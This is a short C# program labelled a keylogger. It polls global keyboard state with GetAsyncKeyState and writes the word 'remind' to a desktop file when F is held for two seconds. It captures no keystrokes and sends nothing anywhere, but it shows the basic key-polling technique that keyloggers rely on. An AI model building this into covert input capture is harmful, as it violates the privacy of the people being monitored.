using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace KeyLoggerLSF
{
    class KeyLogger
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static Stopwatch sw;
        static void Main(string[] args)
        {
            sw = new Stopwatch();
            while (true)
            {
                Thread.Sleep(5);
                bool keyDown = false;

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        keyDown = true;
                        sw.Start();
                        while (keyDown)
                        {
                            keyState = GetAsyncKeyState(i);
                            if (sw.ElapsedMilliseconds == 2000)
                            {
                                if(((char) i).ToString().ToUpper() == "F")
                                {
                                    string path = "C:\\Users\\Karl Lindahl\\Desktop\\keyloggs_lmao.txt";
                                    using (StreamWriter sw = new StreamWriter(path))
                                    {
                                        sw.Write("remind");
                                    }
                                }

                                keyDown = false;
                                ResetTimer();
                            }
                            else if(keyState == 0)
                            {
                                keyDown = false;
                                ResetTimer();
                            }
                        }
                    }
                    else
                    {
                        ResetTimer();
                    }
                }
            }
        }

        public static void ResetTimer()
        {
            sw.Stop();
            sw.Reset();
        }
    }
}
